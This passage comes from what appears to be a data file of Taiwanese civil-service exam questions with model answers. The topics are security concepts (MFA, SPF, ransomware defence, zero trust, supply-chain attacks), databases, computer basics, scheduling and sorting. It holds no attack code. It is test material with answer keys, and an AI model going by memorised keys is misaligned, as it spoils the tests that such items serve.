長度為十個字元，因此格式正確。</li><li>安全密碼 <code>Abcdef1234</code> 長度為十個字元，且包含大寫、小寫與數字，因此格式正確。</li><li>輸入 <code>Alice</code> 與 <code>abcdefghij</code> 時，會顯示一般使用者登入成功。</li><li>輸入 <code>Bob</code> 與 <code>Abcdef1234</code> 時，會顯示高階使用者登入成功與權限等級。</li><li>輸入錯誤姓名或密碼時，會顯示登入失敗。</li></ul></section>"
  }
,
  {
    "id": 58,
    "slug": "question-58",
    "title": "警察資訊管理人員：網路安全與資訊倫理",
    "points": "100 分",
    "year": "115年",
    "examName": "警察資訊管理人員",
    "grade": "三等",
    "category": "資訊管理",
    "subject": "網路安全與資訊倫理",
    "subjectSlug": "115-police-information-management-cybersecurity-ethics",
    "order": "一",
    "html": `<div class="question-head">
            <span class="number">一</span>
            <div>
              <h2>警察資訊管理人員：網路安全與資訊倫理</h2>
              <p>配分 100 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>請回答多因子驗證、SPF 電子郵件安全協定、勒索軟體防護、PAPA 資訊倫理原則，以及直播電商、社群媒體與 AI 推薦技術下的消費者保護議題。</p>
          </section>

          <section class="answer-block">
            <h3>一、多因子驗證 MFA</h3>
            <p>多因子驗證（Multi-Factor Authentication, MFA）是指使用者登入系統時，不只依靠單一密碼，而是必須同時通過兩種以上不同類型的身分驗證因素，以確認其身分。其目的在於降低密碼外洩、遭竊或被暴力破解後，帳號仍被非法登入的風險。</p>
            <ul>
              <li><strong>你知道的東西（Knowledge Factor）：</strong>使用者記憶並輸入的資訊，例如密碼、PIN 碼、圖形密碼、安全問題答案。</li>
              <li><strong>你擁有的東西（Possession Factor）：</strong>使用者實際持有的裝置或憑證，例如手機簡訊 OTP、驗證器 App 動態碼、硬體安全金鑰、智慧卡。</li>
              <li><strong>你本身具備的特徵（Inherence Factor）：</strong>使用者的生物特徵，例如指紋辨識、人臉辨識、虹膜辨識、聲紋辨識。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>二、電子郵件安全協定 SPF</h3>
            <p>寄件者政策框架（Sender Policy Framework, SPF）是用來驗證寄件郵件伺服器是否合法的電子郵件驗證機制。網域管理者會在 DNS 中設定 SPF 記錄，列出哪些 IP 位址或郵件伺服器被授權代表該網域寄信。收件方郵件伺服器收到郵件後，會檢查郵件來源 IP 是否符合寄件網域 DNS 中的 SPF 記錄；若不符合，該郵件可能被判定為偽造、垃圾郵件或釣魚郵件。</p>
            <p>SPF 可降低偽冒寄件網域、電子郵件詐騙、釣魚郵件、垃圾郵件濫發、商務電子郵件詐騙（BEC）、網域信譽遭冒用，以及惡意郵件假冒機關、公司或主管名義寄送等風險。</p>
          </section>

          <section class="answer-block">
            <h3>三、勒索軟體 Ransomware</h3>
            <p>勒索軟體是一種惡意軟體，攻擊者入侵電腦、伺服器或組織網路後，會加密檔案、鎖定系統，甚至竊取資料，接著要求受害者支付贖金，通常以加密貨幣付款，才提供解密金鑰或承諾不外洩資料。</p>
            <ul>
              <li><strong>常見入侵方式：</strong>釣魚郵件附件或惡意連結、系統或軟體漏洞、RDP 密碼遭破解、下載盜版軟體或惡意程式、供應鏈攻擊、惡意網站或社交工程誘騙。</li>
              <li><strong>主要目的：</strong>勒索金錢，也可能包含竊取機密資料、癱瘓組織營運、破壞系統可用性或進行政治、犯罪目的攻擊。</li>
            </ul>
            <p>防範措施包括定期離線或異地備份、更新作業系統與應用程式、啟用端點防護與 EDR、加強電子郵件過濾、遠端登入啟用 MFA 並限制 RDP 對外開放、落實最小權限、建立網路分段、定期資安教育訓練、建立事件應變計畫，以及監控異常流量、登入與大量檔案加密行為。</p>
          </section>

          <section class="answer-block">
            <h3>四、資訊倫理與 PAPA 原則</h3>
            <p><strong>Property（所有權）</strong>指資訊、資料、軟體、創作內容或智慧財產應歸屬於誰，以及他人是否有權使用、複製、散布或修改，例如著作權、專利權、商標權、資料庫權利與軟體授權。</p>
            <p><strong>Accessibility（使用權或可近用性）</strong>指誰有權取得、使用或存取資訊，以及資訊系統是否能讓合法使用者公平、便利、安全地使用，例如身心障礙者是否能使用網站、弱勢族群是否能取得數位服務、機密資料是否只允許授權人員存取。</p>
            <p>AI 與社群媒體發展下，可能產生隱私侵害、演算法偏見、假訊息與深偽內容、AI 產生錯誤資訊、智慧財產權爭議、資訊操控與成癮設計、數位落差，以及 AI 造成損害時責任歸屬不明等倫理問題。</p>
          </section>

          <section class="answer-block">
            <h3>五、直播電商、社群媒體與 AI 推薦下的消費者保護</h3>
            <p>完善的消費者保護與退換貨制度，可以保障消費者在網路交易中不因資訊不對稱而受害。網路購物無法像實體店面一樣直接檢查商品，因此消費者容易遇到商品與廣告不符、品質不良、尺寸不合、功能誇大或賣家不負責等問題。</p>
            <p>完善退換貨機制可保障公平交易權益、降低網購風險、提升消費信任、促使業者提供真實商品資訊、減少消費糾紛與詐欺行為，並讓消費者在直播或社群衝動購物後仍有合理救濟機會。</p>
            <p>可能產生的消費爭議與法律問題包括商品與廣告不符、不實廣告或誇大宣傳、退換貨爭議、七日鑑賞期適用爭議、個人資料保護問題、AI 推薦與演算法操控、跨境購物糾紛、假貨與侵權商品、付款詐騙，以及直播主與平台責任問題。</p>
          </section>`
  }
,
  {
    "id": 59,
    "slug": "question-59",
    "title": "小農在地作物自產自銷系統 ER 圖、關聯綱要與 SQL",
    "points": "50 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等",
    "category": "資訊組（選試英文）",
    "subject": "資料庫應用",
    "subjectSlug": "115-national-security-intelligence-third-database-application",
    "order": "一",
    "html": `<div class="question-head">
            <span class="number">一</span>
            <div>
              <h2>小農在地作物自產自銷系統 ER 圖、關聯綱要與 SQL</h2>
              <p>配分 50 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>農村眾小農想設計一套在地作物自產自銷系統。小農 Farmer 需登錄 FID、FNAME、FADDR、FACC；農地 Land 需登錄 LID、LSIZE 並知道擁有的小農；作物 Crop 由系統預先設定 CID，且同種作物 CPRICE、CNAME 相同，小農提供作物販售時需設定 PQTY；買家 Buyer 需登錄 BID、BNAME、BADDR、BACC，並可購買多種作物。請繪 ER 圖、轉換關聯式綱要、撰寫插入資料 SQL，以及查詢有賣美人花生的小農姓名與數量。</p>
          </section>

          <section class="answer-block">
            <h3>ER 圖說明</h3>
            <pre class="diagram">Farmer(FID, FNAME, FADDR, FACC)
  1 ── 擁有 ── N Land(LID, LSIZE)

Farmer(FID) N ── 提供 ── N Crop(CID, CNAME, CPRICE)
                     關係屬性：PQTY

Buyer(BID, BNAME, BADDR, BACC)
  N ── 購買 ── N 提供(FID, CID, PQTY)</pre>
            <p>每一塊農地只能登記在一位小農名下，因此 Farmer 與 Land 是一對多。小農可提供多種作物，同一作物也可由多位小農提供，因此 Farmer 與 Crop 是多對多，並以「提供」關係記錄販售數量 PQTY。買家購買的是某位小農提供的某種作物，因此購買關係可連到提供清單。</p>
          </section>

          <section class="answer-block">
            <h3>關聯式綱要表</h3>
            <ul>
              <li><strong>Farmer(<u>FID</u>, FNAME, FADDR, FACC)</strong></li>
              <li><strong>Land(<u>LID</u>, LSIZE, FID)</strong>，FID 為外鍵參照 Farmer(FID)。</li>
              <li><strong>Crop(<u>CID</u>, CNAME, CPRICE)</strong></li>
              <li><strong>Provide(<u>FID</u>, <u>CID</u>, PQTY)</strong>，FID 參照 Farmer(FID)，CID 參照 Crop(CID)。</li>
              <li><strong>Buyer(<u>BID</u>, BNAME, BADDR, BACC)</strong></li>
              <li><strong>Buy(<u>BID</u>, <u>FID</u>, <u>CID</u>)</strong>，BID 參照 Buyer(BID)，(FID, CID) 參照 Provide(FID, CID)。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>插入志明資料 SQL</h3>
            <pre><code>INSERT INTO Farmer (FID, FNAME, FADDR, FACC)
VALUES ('945', '志明', '臺灣尚水村嘉南平原路99號', '314159265');

INSERT INTO Land (LID, LSIZE, FID)
VALUES ('168', 400, '945');

INSERT INTO Crop (CID, CNAME, CPRICE)
VALUES ('88', '美人花生', 1000);

INSERT INTO Provide (FID, CID, PQTY)
VALUES ('945', '88', 2000);</code></pre>
            <p>題目給定今年收成 2 公噸，因 PQTY 單位是公斤，所以應登錄為 2000 公斤。</p>
          </section>

          <section class="answer-block">
            <h3>查詢有賣美人花生的小農姓名與數量</h3>
            <pre><code>SELECT F.FNAME, P.PQTY
FROM Farmer AS F
JOIN Provide AS P
  ON F.FID = P.FID
WHERE P.CID = ?;</code></pre>
            <p>使用者查詢時輸入作物編號，例如美人花生的 CID 為 88，系統即可帶入參數查詢。</p>
          </section>`
  },
  {
    "id": 60,
    "slug": "question-60",
    "title": "訂單商品評價表第一、第二與第三正規化",
    "points": "25 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等",
    "category": "資訊組（選試英文）",
    "subject": "資料庫應用",
    "subjectSlug": "115-national-security-intelligence-third-database-application",
    "order": "二",
    "html": `<div class="question-head">
            <span class="number">二</span>
            <div>
              <h2>訂單商品評價表第一、第二與第三正規化</h2>
              <p>配分 25 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>在一個電商訂單商品評價系統中，資料欄位包含 OID、PID、SID、Rating、RID、Comment、SName。原表不滿足第一正規化。請轉成 1NF 的 R1，並依功能相依 OID→SID、SID→SName、RID→Comment、RID→Rating，分別列出符合第二正規化與第三正規化的表格。</p>
          </section>

          <section class="answer-block">
            <h3>第一正規化 R1</h3>
            <p>第一正規化要求每個欄位值皆為不可再分割的原子值，因此同一訂單中的多個商品評價需拆成多筆列。</p>
            <p><strong>R1(<u>OID</u>, <u>PID</u>, SID, Rating, RID, Comment, SName)</strong></p>
            <div class="table-wrap">
              <table>
                <thead><tr><th>OID</th><th>PID</th><th>SID</th><th>Rating</th><th>RID</th><th>Comment</th><th>SName</th></tr></thead>
                <tbody>
                  <tr><td>O101</td><td>P99</td><td>S01</td><td>2</td><td>R801</td><td>貨超爛</td><td>南陽大諸</td></tr>
                  <tr><td>O101</td><td>P98</td><td>S01</td><td>4</td><td>R802</td><td>包裝好</td><td>南陽大諸</td></tr>
                  <tr><td>O102</td><td>P99</td><td>S02</td><td>5</td><td>R403</td><td>出貨快</td><td>臺灣香薯</td></tr>
                </tbody>
              </table>
            </div>
          </section>

          <section class="answer-block">
            <h3>第二正規化</h3>
            <p>R1 的主鍵可視為 (OID, PID)。因 OID→SID，且 SID→SName，商家資料與複合主鍵的一部分有關，需先拆出訂單對商家的資料。</p>
            <ul>
              <li><strong>R11(<u>OID</u>, SID, SName)</strong></li>
              <li><strong>R12(<u>OID</u>, <u>PID</u>, RID, Rating, Comment)</strong></li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>第三正規化</h3>
            <p>第三正規化需進一步移除非鍵屬性對非鍵屬性的相依。R11 中 SID→SName，R12 中 RID→Rating、Comment，因此再拆解如下：</p>
            <ul>
              <li><strong>R111(<u>OID</u>, SID)</strong></li>
              <li><strong>R112(<u>SID</u>, SName)</strong></li>
              <li><strong>R121(<u>OID</u>, <u>PID</u>, RID)</strong></li>
              <li><strong>R122(<u>RID</u>, Rating, Comment)</strong></li>
            </ul>
          </section>`
  },
  {
    "id": 61,
    "slug": "question-61",
    "title": "分散式資料庫三種通透性",
    "points": "15 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等",
    "category": "資訊組（選試英文）",
    "subject": "資料庫應用",
    "subjectSlug": "115-national-security-intelligence-third-database-application",
    "order": "三",
    "html": `<div class="question-head">
            <span class="number">三</span>
            <div>
              <h2>分散式資料庫三種通透性</h2>
              <p>配分 15 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>請就分散式資料庫的位置通透性（Location Transparency）、分割通透性（Fragmentation Transparency）、複製通透性（Replication Transparency），說明這些通透性的概念和特性。</p>
          </section>

          <section class="answer-block">
            <h3>說明</h3>
            <ul>
              <li><strong>位置通透性：</strong>使用者查詢資料時，不需要知道資料實際存放在哪一個節點或伺服器。系統會自動將查詢導向正確位置，因此資料搬移或節點配置調整時，應盡量不影響應用程式。</li>
              <li><strong>分割通透性：</strong>資料表可能被水平分割或垂直分割後存放於不同節點，但使用者仍可像操作完整資料表一樣查詢。系統負責合併、重組或導向各片段，隱藏資料被切割的細節。</li>
              <li><strong>複製通透性：</strong>同一份資料可能有多個副本存放於不同節點，以提升可用性、容錯與查詢效能。使用者不需知道有幾份副本或副本在哪裡，系統負責選擇副本、維持一致性並處理更新同步。</li>
            </ul>
          </section>`
  },
  {
    "id": 62,
    "slug": "question-62",
    "title": "交易故障時的資料庫回復方法",
    "points": "10 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等",
    "category": "資訊組（選試英文）",
    "subject": "資料庫應用",
    "subjectSlug": "115-national-security-intelligence-third-database-application",
    "order": "四",
    "html": `<div class="question-head">
            <span class="number">四</span>
            <div>
              <h2>交易故障時的資料庫回復方法</h2>
              <p>配分 10 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>當資料庫管理系統進行交易（Transaction）時發生故障，為確保資料的原子性（Atomicity）與持續性（Durability），有兩種回復處理方法。請說明這兩種方法在尚未 COMMIT 之前會如何處理資料。</p>
          </section>

          <section class="answer-block">
            <h3>Deferred Update 與 Immediate Update</h3>
            <ul>
              <li><strong>延遲更新（Deferred Update）：</strong>交易尚未 COMMIT 前，不會把更新真正寫入資料庫，只先把更新內容記錄在日誌或暫存區。若交易故障且尚未提交，因資料庫尚未被修改，通常不需要 UNDO；若已提交但尚未完全寫入，則依日誌 REDO，以確保持續性。</li>
              <li><strong>立即更新（Immediate Update）：</strong>交易尚未 COMMIT 前，更新可能已先寫入資料庫，因此必須使用 write-ahead logging，先記錄舊值與新值。若交易未提交就故障，系統需依日誌 UNDO，回復到交易前狀態以確保原子性；若交易已提交但部分資料尚未落盤，則需 REDO 以確保持續性。</li>
            </ul>
          </section>`
  },
  {
    "id": 63,
    "slug": "question-63",
    "title": "不同進位數相加並以八進位表示",
    "points": "15 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "一",
    "html": `<div class="question-head"><span class="number">一</span><div><h2>不同進位數相加並以八進位表示</h2><p>配分 15 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>A = (1982)<sub>10</sub>，B = (3456)<sub>8</sub>，C = (6C7D)<sub>16</sub>，D = (10101101)<sub>2</sub>。計算 A、B、C、D 四數之和，並用八進位表示答案，請詳列計算過程。</p></section>
          <section class="answer-block"><h3>轉成十進位</h3><pre><code>A = (1982)10 = 1982
B = (3456)8 = 3*8^3 + 4*8^2 + 5*8 + 6
  = 3*512 + 4*64 + 40 + 6
  = 1536 + 256 + 40 + 6 = 1838
C = (6C7D)16 = 6*16^3 + C*16^2 + 7*16 + D
  = 6*4096 + 12*256 + 112 + 13
  = 24576 + 3072 + 112 + 13 = 27773
D = (10101101)2
  = 1*128 + 0*64 + 1*32 + 0*16 + 1*8 + 1*4 + 0*2 + 1
  = 173</code></pre></section>
          <section class="answer-block"><h3>加總並轉八進位</h3><pre><code>總和 = 1982 + 1838 + 27773 + 173 = 31766

31766 / 8 = 3970 ... 6
3970  / 8 = 496  ... 2
496   / 8 = 62   ... 0
62    / 8 = 7    ... 6
7     / 8 = 0    ... 7</code></pre><p>由最後的餘數往回讀，得到 <strong>(76026)<sub>8</sub></strong>。因此 A、B、C、D 四數之和為 <strong>(76026)<sub>8</sub></strong>。</p></section>`
  },
  {
    "id": 64,
    "slug": "question-64",
    "title": "HDD 與 SSD 差異比較",
    "points": "15 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "二",
    "html": `<div class="question-head"><span class="number">二</span><div><h2>HDD 與 SSD 差異比較</h2><p>配分 15 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>請詳細比較傳統硬碟（HDD）和固態硬碟（SSD）之差異。</p></section>
          <section class="answer-block"><h3>比較表</h3><table><thead><tr><th>項目</th><th>HDD</th><th>SSD</th></tr></thead><tbody><tr><td>儲存原理</td><td>以磁性碟盤儲存資料，讀寫頭在碟盤上方定位。</td><td>以 NAND Flash 快閃記憶體儲存資料，無機械讀寫頭。</td></tr><tr><td>速度</td><td>受碟盤轉速、尋道時間影響，隨機讀寫較慢。</td><td>存取延遲低，隨機讀寫與開機、載入程式速度通常明顯較快。</td></tr><tr><td>耐震性</td><td>有旋轉碟盤與讀寫頭，碰撞時較容易受損。</td><td>無移動機械結構，抗震與攜帶穩定性較佳。</td></tr><tr><td>噪音與耗電</td><td>馬達與碟盤旋轉會產生噪音與震動，耗電較高。</td><td>無旋轉部件，較安靜且通常較省電。</td></tr><tr><td>容量與價格</td><td>大容量單位價格較低，適合大量資料保存。</td><td>單位容量價格較高，但近年價格下降，適合系統碟與高速應用。</td></tr><tr><td>壽命限制</td><td>主要受機械磨耗、壞軌、震動與老化影響。</td><td>快閃記憶體有寫入次數限制，但有 wear leveling、TRIM 等機制延長壽命。</td></tr><tr><td>資料救援</td><td>故障後若碟盤未嚴重損壞，仍可能透過專業方式救援。</td><td>控制器、加密與磨耗平均化使救援較複雜。</td></tr></tbody></table></section>
          <section class="answer-block"><h3>結論</h3><p>HDD 優點是容量大、成本低，適合作為備份、影音資料與大量歸檔儲存。SSD 優點是速度快、延遲低、安靜、省電且耐震，適合作為作業系統、應用程式、資料庫或需要快速存取的工作磁碟。實務上常採 SSD 作系統碟、HDD 作大量資料碟的混合配置。</p></section>`
  },
  {
    "id": 65,
    "slug": "question-65",
    "title": "二元搜尋樹由小到大排序演算法",
    "points": "15 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "三",
    "html": `<div class="question-head"><span class="number">三</span><div><h2>二元搜尋樹由小到大排序演算法</h2><p>配分 15 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>有一組資料以二元搜尋樹（binary search tree）的結構儲存，請提供一個演算法，將這組資料由小到大排序，並舉例說明。</p></section>
          <section class="answer-block"><h3>演算法</h3><p>二元搜尋樹的性質是：對任一節點而言，左子樹所有節點值小於該節點，右子樹所有節點值大於該節點。因此只要對 BST 做中序走訪（inorder traversal），順序為左子樹、根節點、右子樹，就會得到由小到大的排序結果。</p><pre><code>Inorder(node):
    if node == null:
        return
    Inorder(node.left)
    output node.data
    Inorder(node.right)</code></pre></section>
          <section class="answer-block"><h3>範例</h3><pre class="tree-pre"><code>        50
       /  \\
     30    70
    / \\   / \\
  20  40 60  80</code></pre><p>中序走訪流程為：先走訪 50 的左子樹，得到 20、30、40；接著輸出根節點 50；最後走訪右子樹，得到 60、70、80。因此排序結果為：</p><pre><code>20, 30, 40, 50, 60, 70, 80</code></pre><p>若樹中有 n 個節點，每個節點只拜訪一次，時間複雜度為 O(n)；遞迴所需空間與樹高有關，平均為 O(log n)，最壞為 O(n)。</p></section>`
  },
  {
    "id": 66,
    "slug": "question-66",
    "title": "以 AND 與 XOR 實作 NOT 邏輯閘",
    "points": "15 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "四",
    "html": `<div class="question-head"><span class="number">四</span><div><h2>以 AND 與 XOR 實作 NOT 邏輯閘</h2><p>配分 15 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>當實作電路時發現缺少 NOT 邏輯閘，但手邊有 AND Gate 與 XOR Gate，請問如何應用現有邏輯閘達成 NOT 邏輯閘功能需求？</p></section>
          <section class="answer-block"><h3>作法</h3><p>XOR 的特性是：當兩個輸入相同時輸出 0，不同時輸出 1。因此若將待反相的輸入設為 X，另一端接固定邏輯 1，則輸出為：</p><pre><code>Y = X XOR 1</code></pre><table><thead><tr><th>X</th><th>1</th><th>X XOR 1</th><th>NOT X</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td></tr></tbody></table><p>由真值表可知 <code>X XOR 1</code> 與 <code>NOT X</code> 完全相同，因此可用一個 XOR Gate 加上固定邏輯 1 來取代 NOT Gate。</p></section>
          <section class="answer-block"><h3>補充說明</h3><p>若電路環境允許接高電位 Vcc 或常數 1，則 AND Gate 不一定需要使用。若題目限制完全不能使用常數 1，只能使用輸入變數、AND 與 XOR，則無法實作 NOT，因為 AND 與 XOR 對全 0 輸入都只能產生 0，但 NOT 在輸入 0 時必須輸出 1。</p></section>`
  },
  {
    "id": 67,
    "slug": "question-67",
    "title": "FCFS 排程週轉時間計算",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "五",
    "html": `<div class="question-head"><span class="number">五</span><div><h2>FCFS 排程週轉時間計算</h2><p>配分 20 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>某一作業系統之中央處理器排程使用先到先服務（first-come, first-served scheduling）。若佇列共有 P1、P2、P3、P4，抵達時間與所需執行時間如下：P1(0,5)、P2(3,7)、P3(10,3)、P4(17,4)。請計算每個程序的總執行時間（turnaround time）。時間單位為毫秒。</p></section>
          <section class="answer-block"><h3>排程甘特圖</h3><p>FCFS 依照到達順序執行，且非搶先式。各程序到達順序為 P1、P2、P3、P4。</p><pre><code>0      5       12      15   17      21
|  P1  |   P2   |  P3  |idle|  P4  |</code></pre><p>P3 執行完時間為 15，但 P4 到達時間是 17，所以 CPU 在 15 到 17 之間閒置。</p></section>
          <section class="answer-block"><h3>週轉時間</h3><p>週轉時間 = 完成時間 - 到達時間。</p><table><thead><tr><th>程序</th><th>到達時間</th><th>執行時間</th><th>完成時間</th><th>週轉時間</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>5</td><td>5</td><td>5 - 0 = 5</td></tr><tr><td>P2</td><td>3</td><td>7</td><td>12</td><td>12 - 3 = 9</td></tr><tr><td>P3</td><td>10</td><td>3</td><td>15</td><td>15 - 10 = 5</td></tr><tr><td>P4</td><td>17</td><td>4</td><td>21</td><td>21 - 17 = 4</td></tr></tbody></table><p>因此 P1、P2、P3、P4 的週轉時間分別為 <strong>5、9、5、4 毫秒</strong>。</p></section>`
  },
  {
    "id": 68,
    "slug": "question-68",
    "title": "Python 插入排序輸出與流程",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "計算機概論",
    "subjectSlug": "115-national-security-third-computer-introduction",
    "order": "六",
    "html": `<div class="question-head"><span class="number">六</span><div><h2>Python 插入排序輸出與流程</h2><p>配分 20 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>寫出下列 Python 程式的輸出，並詳細解釋程式執行流程。程式對陣列 <code>[35, 91, 25, 30, 6, 18, 8, 55]</code> 執行 <code>foo(arr)</code>。</p></section>
          <section class="answer-block"><h3>程式功能</h3><p>此程式是插入排序法（insertion sort）。外層迴圈從索引 1 到 n-1，每次取出 <code>key = arr[i]</code>，再將左邊已排序區中比 key 大的元素往右移，最後把 key 放到正確位置。每一輪外層迴圈結束後都會 <code>print(arr)</code>，因此會印出 7 行。</p></section>
          <section class="answer-block"><h3>逐輪結果</h3><table><thead><tr><th>i</th><th>key</th><th>說明</th><th>列印結果</th></tr></thead><tbody><tr><td>1</td><td>91</td><td>35 不大於 91，不移動。</td><td>[35, 91, 25, 30, 6, 18, 8, 55]</td></tr><tr><td>2</td><td>25</td><td>91、35 右移，25 插到最前面。</td><td>[25, 35, 91, 30, 6, 18, 8, 55]</td></tr><tr><td>3</td><td>30</td><td>91、35 右移，30 插在 25 後面。</td><td>[25, 30, 35, 91, 6, 18, 8, 55]</td></tr><tr><td>4</td><td>6</td><td>91、35、30、25 右移，6 插到最前面。</td><td>[6, 25, 30, 35, 91, 18, 8, 55]</td></tr><tr><td>5</td><td>18</td><td>91、35、30、25 右移，18 插在 6 後面。</td><td>[6, 18, 25, 30, 35, 91, 8, 55]</td></tr><tr><td>6</td><td>8</td><td>91、35、30、25、18 右移，8 插在 6 後面。</td><td>[6, 8, 18, 25, 30, 35, 91, 55]</td></tr><tr><td>7</td><td>55</td><td>91 右移，55 插在 35 後面。</td><td>[6, 8, 18, 25, 30, 35, 55, 91]</td></tr></tbody></table></section>
          <section class="answer-block"><h3>完整輸出</h3><pre><code>[35, 91, 25, 30, 6, 18, 8, 55]
[25, 35, 91, 30, 6, 18, 8, 55]
[25, 30, 35, 91, 6, 18, 8, 55]
[6, 25, 30, 35, 91, 18, 8, 55]
[6, 18, 25, 30, 35, 91, 8, 55]
[6, 8, 18, 25, 30, 35, 91, 55]
[6, 8, 18, 25, 30, 35, 55, 91]</code></pre></section>`
  },
  {
    "id": 69,
    "slug": "question-69",
    "title": "邊界防禦與零信任架構之核心差異",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "網路應用與安全",
    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
    "order": "一",
    "html": `<div class="question-head">
            <span class="number">一</span>
            <div>
              <h2>邊界防禦與零信任架構之核心差異</h2>
              <p>配分：20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>傳統網路安全採取邊界防禦模式（Perimeter Defense Model），但現代企業逐漸轉向零信任架構（Zero Trust Architecture, ZTA）。請說明兩者核心理念與差異，並解釋永不信任、持續驗證與最小權限原則的意涵。（10 分）請舉例說明零信任環境下，身分驗證與授權邏輯如何改變，並說明設備健康狀態（Device Posture）如何影響存取決策。（10 分）</p>
          </section>

          <section class="answer-block">
            <h3>核心理念與差異</h3>
            <p>邊界防禦模式假設企業內網相對可信，主要在網路出入口部署防火牆、VPN、閘道器等控制措施，重點是把攻擊者擋在邊界之外。其弱點是：一旦帳號、VPN 或內部主機被攻破，攻擊者可能在內網橫向移動。</p>
            <p>零信任架構則不以網路位置作為信任基礎，而是採取「每一次存取都要被評估」的設計。使用者即使在內網，也不會自動被視為可信；系統會依身分、裝置、位置、行為、資料敏感度與風險分數決定是否允許存取。</p>
            <ul>
              <li><strong>永不信任：</strong>不因使用者位於內網、連上 VPN 或使用公司設備就直接放行。</li>
              <li><strong>持續驗證：</strong>不只登入時驗證，存取期間也會依風險變化重新評估，例如異常地點登入或行為偏離常態時要求重新驗證。</li>
              <li><strong>最小權限：</strong>只給完成工作所需的最小資源、最小操作權限與最短有效時間。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>身分、授權與設備健康狀態</h3>
            <p>在傳統模式下，員工連上 VPN 後常可看到較大範圍的內部系統；在零信任環境下，員工即使登入成功，仍須經過多因素驗證、角色判斷、工作情境與風險評估，才能存取特定應用程式。例如財務人員只能進入付款系統的審核功能，不能直接連到資料庫或其他部門系統。</p>
            <p>設備健康狀態會直接影響存取決策。若筆電有啟用磁碟加密、EDR 正常、作業系統與瀏覽器已更新，系統可允許正常存取；若裝置未安裝安全修補、偵測到惡意程式、EDR 離線或來自未註冊設備，系統可能拒絕存取、只允許低敏感資料、要求隔離修復，或觸發額外 MFA。</p>
          </section>`
  },
  {
    "id": 70,
    "slug": "question-70",
    "title": "供應鏈攻擊、案例與 SBOM 風險控管",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "網路應用與安全",
    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
    "order": "二",
    "html": `<div class="question-head">
            <span class="number">二</span>
            <div>
              <h2>供應鏈攻擊、案例與 SBOM 風險控管</h2>
              <p>配分：20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>近年來供應鏈攻擊（Supply Chain Attack）已成為國家級威脅。請解釋何謂供應鏈攻擊，並各舉一個軟體與硬體層面的實際案例。（10 分）請說明攻擊者為何鎖定第三方供應商而非直接攻擊最終目標，並說明軟體物料清單（SBOM）如何協助降低此類風險。（10 分）</p>
          </section>

          <section class="answer-block">
            <h3>定義與案例</h3>
            <p>供應鏈攻擊是指攻擊者不直接攻擊最終目標，而是滲透其信任的供應商、開發流程、更新機制、套件庫、硬體零組件或外包維運管道，再藉由受信任關係進入目標環境。</p>
            <ul>
              <li><strong>軟體案例：</strong>SolarWinds Orion 事件中，攻擊者污染軟體建置與更新流程，使受害組織安裝含後門的合法更新套件。</li>
              <li><strong>硬體案例：</strong>硬體供應鏈可能在韌體、晶片、網通設備或出貨前設定中植入後門。例如遭竄改的網路設備韌體可在部署後提供遠端控制或資料外洩通道。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>攻擊者鎖定第三方的原因與 SBOM</h3>
            <p>攻擊者鎖定第三方供應商，是因為大型政府或企業通常資安成熟度較高，直接入侵成本高；但供應商可能資源有限、權限很高，且更新、維運帳號或 API 已被最終目標信任。攻破一個供應商還可能同時影響多個客戶，具有放大效果。</p>
